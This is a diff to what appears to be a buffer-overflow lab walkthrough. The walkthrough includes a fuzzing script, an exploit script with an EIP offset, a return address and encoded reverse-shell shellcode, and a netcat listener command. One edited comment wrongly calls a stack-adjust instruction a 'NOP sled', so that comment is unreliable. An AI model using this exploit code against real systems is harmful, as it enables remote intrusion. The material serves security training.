@@ -40,7 +40,7 @@ To fuzz the `ospc.exe` program to see if it is vulnerable, send it a long string
 characters will eventually exceed the memory buffer causing the buffer overflow. Use the script below and adapt it 
 with the IP address of the host and the overflow to target. 
 
-```text
+```python
 #!/usr/bin/env python3
 
 import socket, time, sys
@@ -67,6 +67,7 @@ while True:
     sys.exit(0)
   string += 100 * "A"
   time.sleep(1)
+
 ```
 
 Make sure `ospc.exe` is running in Immunity Debugger, then launch the fuzzing script. 
@@ -84,7 +85,7 @@ example, by using Metasploit and adding 400 bytes to the 2000 that crashed the s
 
 Edit the python payload below and add the cyclic pattern to the payload variable:
 
-```text
+```python
 import socket
 
 ip = "KALI_IP"
@@ -107,8 +108,9 @@ try:
   print("Sending evil buffer...")
   s.send(bytes(buffer + "\r\n", "latin-1"))
   print("Done!")
-except:
+except socket.error:
   print("Could not connect.")
+
 ```
 
 Name it `exploit.py` and launch it.
@@ -283,18 +285,18 @@ padding = "\x90" * 16
 With the correct prefix, offset, return address, padding, and payload set, exploit the buffer overflow to get a 
 reverse shell.
 
-```text
+```python
 #!/usr/bin/env python3
 import socket
 
-ip = "KALI_IP"
+ip = "MACHINE_IP"
 port = 1337
 
 prefix = "OVERFLOW1 "
-offset = 1978
+offset = 1978                            # EIP offset
 overflow = "A" * offset
-retn = "\xaf\x11\x50\x62" # overwriting the return pointer with the memory address of a valid jmp esp instruction
-padding = "\x83\xec\x10" # Moving the ESP pointer "up" the stack by 16 bytes to make room for the encoder operations
+retn = "\xaf\x11\x50\x62"               # Overwriting the return pointer
+padding = "\x83\xec\x10"                # NOP sled 
 payload = ("\xda\xd5\xba\xdb\x9b\x35\xe7\xd9\x74\x24\xf4\x5d\x29\xc9\xb1"
 "\x52\x31\x55\x17\x03\x55\x17\x83\x36\x67\xd7\x12\x34\x70\x9a"
 "\xdd\xc4\x81\xfb\x54\x21\xb0\x3b\x02\x22\xe3\x8b\x40\x66\x08"
@@ -330,8 +332,11 @@ try:
 	print("[+] Sending evil buffer")
 	s.send(bytes(buffer + "\r\n", "latin-1"))
 	print("[+] Done!")
-except:
+except socket.error:
 	print("[-] Could not connect.")
+finally:
+    s.close()
+
 ```
 
 Start a netcat listener on the Kali box using the LPORT specified in the `msfvenom` command (`1337`).
@@ -342,5 +347,9 @@ sudo nc -lvnp 1337
 
 Restart `oscp.exe` in Immunity and run the modified `exploit.py` script again. The netcat listener should catch a 
 reverse shell.
+
+## Resources
+
+* [A Beginner’s Guide to Buffer Overflow](https://www.hackingarticles.in/a-beginners-guide-to-buffer-overflow/)
 
 
